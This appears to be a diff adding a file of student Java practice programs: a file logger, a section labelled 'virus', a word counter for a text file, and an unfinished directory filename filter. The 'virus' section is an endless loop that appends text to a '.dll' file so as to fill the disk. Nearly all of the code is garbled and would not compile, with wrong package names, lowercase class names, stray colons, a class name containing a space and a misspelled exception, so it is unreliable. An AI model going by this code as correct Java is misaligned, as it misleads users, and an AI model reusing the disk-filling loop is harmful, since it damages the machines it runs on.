@@ -1,0 +1,112 @@
+import java.io.*;
+import java.util.logger.*;
+public class log{
+public static void main(String[] args){
+Logger l=new Logger.getLogger(log.class.getName());
+FileHandler fh;
+try
+{
+fh=new FileHandler("D:/mylog.log",true);
+l.addHandler(fh);
+l.setLevel(Level.ALL);
+simpleFormatter sf= new simpleFormatter();
+fh.setFormatter(sf);
+l.info("my first log");
+}
+catch(SecurityException e)
+{
+ e.printstackTrace();
+}
+catch(IOException e)
+{
+e.printStackTrace();
+}
+
+l.info("this is cfl prac" );
+}
+
+---------------------------virus
+import java.io.*;
+public class virus{
+public static void main(String[] args)
+{
+try
+{
+fileWriter f= new fileWriter(".dll",true):
+while(true)
+{
+f.write("program is a fum:4")
+}
+}
+catch(IOException e){}
+catch(FileNoteFoundExeption e){}
+}
+}
+---------------------------search a word in file------------------------------------------------
+java.util.io.file;
+java.util.io.FileReader;
+java.util.io.BufferedReader;
+java.util.io.Scanner;
+public class word search{
+public static void main(String[] args){
+cnt=0;
+string s;
+string[] buffer;
+File f1= new File("D://file.txt");
+FileReader fr=new FileReader(f1);
+BufferedReader bfr=new BufferReaader(fr);
+Scanner sc= new Scanner(system.in);
+system.out.println("enter a word for search");
+string wrd=sc.nextLine();
+
+while((s=bfr.readLine())!=null)
+{
+buffer=s.split(" ");
+for (string chr:buffer)
+{
+if(chr.equals(wrd))
+{
+cnt++;
+}
+}
+}
+if(cnt==0)
+{
+print(wordnotfound);
+}
+else 
+{
+print(+wrd,+cnt)
+}
+fr.close();
+}}
+-------------------------------------------------search a file in adirectory
+
+import java.util.*;
+import java.io.*;
+public class dir
+{
+public static void main (String[] args)
+{
+
+scanner sc=new scanner(System.in);
+
+system.out.println("enter a directory name"):
+string str1=sc.nextLine();
+
+file dir=new file(str1);
+
+system.out.println("enter a first letter of file");
+string str2=sc.nextLine();
+
+filenamefilter filter=new filenamefilter();
+{
+public boolean accept(file dir,string name)
+{
+return name.startswith(str2);
+}
+}
+
+
+}
+}
